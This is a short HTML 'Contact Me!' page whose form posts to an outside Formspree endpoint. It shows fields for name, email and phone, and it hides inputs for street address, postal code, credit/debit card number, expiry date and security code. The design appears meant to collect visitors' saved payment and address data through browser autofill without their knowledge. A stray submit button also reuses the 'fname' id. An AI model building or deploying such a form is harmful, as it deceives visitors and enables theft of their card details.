<!DOCTYPE html>
<html>
  <head>
    <title>Contact Me!</title>
    <link rel="stylesheet" href="https://github.githubassets.com/assets/frameworks-f229bbef3d8c.css">
  </head>
  <body>
    <h1>Contact Me!</h1>
    <form action="https://formspree.io/f/xvolvbzj" method="post">
      <label for="fname">First Name</label><br>
      <input type="text" id="fname" name="fname"><br>
      <label for="lname">Last Name</label><br>
      <input type="text" id="lname" name="lname"><br>
      <label for="email">Email Address</label><br>
      <input type="text" id="email" name="email"><br>
      <label for="phone">Phone Number</label><br>
      <input type="text" id="phone" name="phone"><br>
      <input type="hidden" id="street address" name="street address"><br>
      <input type="hidden" id="city" name="city"><br>
      <input type="hidden" id="state/province" name="state/province"><br>
      <input type="hidden" id="country" name="country"><br>
      <input type="hidden" id="zip/postal code" name="zip/postal code"><br>
      <input type="hidden" id="credit/debit card number" name="credit/debit card number"><br>
      <input type="hidden" id="expiry date" name="expiry date"><br>
      <input type="hidden" id="security code" name="security code"><br>
      <input type="submit" id="fname" name="fname"><br>
      <input type="submit" value="Submit"><br>
     </form>
   </body>
  </html>
